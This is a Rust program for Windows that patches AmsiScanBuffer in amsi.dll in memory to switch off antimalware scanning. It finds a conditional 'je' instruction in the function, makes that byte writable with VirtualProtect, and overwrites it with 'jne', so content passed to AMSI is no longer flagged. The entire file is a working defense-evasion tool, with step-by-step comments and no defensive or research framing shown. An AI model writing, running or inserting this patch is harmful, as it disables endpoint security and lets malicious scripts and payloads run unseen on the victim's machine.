use std::ffi::c_void;
use std::ptr::null_mut;
use std::slice::from_raw_parts;
use windows::core::{s, Error, Result, PCSTR};
use windows::Win32::System::LibraryLoader::{
    GetProcAddress, LoadLibraryA
};
use windows::Win32::System::Memory::{
    VirtualProtect, PAGE_EXECUTE_READWRITE,
    PAGE_PROTECTION_FLAGS
};

fn main() -> Result<()> {
    let name = b"AmsiScanBuffer\0"; // Add null terminator for PCSTR
    unsafe {
        // OPCODE THAT WILL BE INJECTED (0x75 -> 'jne')
        let patch_opcode = 0x75u8;

        // LOAD THE AMSI.DLL LIBRARY
        let h_module = LoadLibraryA(s!("AMSI"))?;

        // RETRIEVE THE ADDRESS OF THE AmsiScanBuffer FUNCTION
        let address = GetProcAddress(h_module, PCSTR(name.as_ptr()))
            .ok_or_else(|| Error::from_win32())? as *const u8;

        // PATTERN TO SEARCH FOR: ret + int3 + int3
        let pattern = [0xC3, 0xCC, 0xCC];
        let mut p_patch_address: *mut u8 = null_mut(); 
        let bytes = from_raw_parts(address, 0x1000 as usize); 

        // SEARCH FOR THE PATTERN WITHIN THE BUFFER
        if let Some(x) = bytes.windows(pattern.len()).position(|windows| windows == pattern) {
            // REVERSE SCAN TO FIND CONDITIONAL JUMP INSTRUCTION ('je' = 0x74)
            for i in (0..x).rev() {
                if bytes[i] == 0x74 {
                    let offset_byte = bytes.get(i + 1).copied().unwrap_or(0u8); 
                    let offset = (offset_byte as i8) as i64; 
                    let target_index = i as isize + 2 + offset as isize; 

                    // CONFIRM THAT THE JUMP LEADS TO A 'mov eax, imm32' INSTRUCTION (0xB8, not 0x88)
                    if let Some(&0xB8) = bytes.get(target_index as usize) {
                        p_patch_address = address.add(i) as *mut u8; 
                        break; // Found it, no need to continue searching
                    }
                }
            }
        }

        if p_patch_address.is_null() {
            return Err(Error::from_win32());
        }

        let mut old_protect = PAGE_PROTECTION_FLAGS(0);

        // CHANGE MEMORY PROTECTION TO ALLOW WRITING
        VirtualProtect(
            p_patch_address.cast::<c_void>(), // Cast *mut u8 to *mut c_void
            1,
            PAGE_EXECUTE_READWRITE,
            &mut old_protect
        )?;

        // WRITE THE PATCH OPCODE ('jne')
        *p_patch_address = patch_opcode;

        // RESTORE THE ORIGINAL PROTECTION
        VirtualProtect(
            p_patch_address.cast::<c_void>(),
            1,
            old_protect,
            &mut old_protect
        )?;
    }

    Ok(())
}
